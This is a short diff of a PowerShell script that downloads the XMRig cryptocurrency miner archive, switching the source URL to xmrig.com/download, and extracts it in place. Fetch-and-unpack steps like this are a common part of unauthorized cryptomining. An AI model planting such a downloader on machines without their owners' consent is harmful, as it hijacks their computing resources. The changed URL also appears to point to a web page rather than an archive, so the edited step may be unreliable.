@@ -68,10 +68,10 @@ cd $wd
 $currentDirectory = $PWD
 
 # Download the ZIP file
-Invoke-WebRequest -Uri "https://sourceforge.net/projects/xmrig.mirror/files/v6.22.2/xmrig-6.22.2-gcc-win64.zip/download" -OutFile "$currentDirectory\xmrig-6.22.2-gcc-win64.zip"
+Invoke-WebRequest -Uri "https://xmrig.com/download" -OutFile "$currentDirectory\xmrig-6.22.2.zip"
 
 # Extract the ZIP file in the current directory
-Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-gcc-win64.zip" -DestinationPath $currentDirectory
+Expand-Archive -Path "$currentDirectory\xmrig-6.22.2.zip" -DestinationPath $currentDirectory
 
 # Verify extraction
 Get-ChildItem -Path $currentDirectory
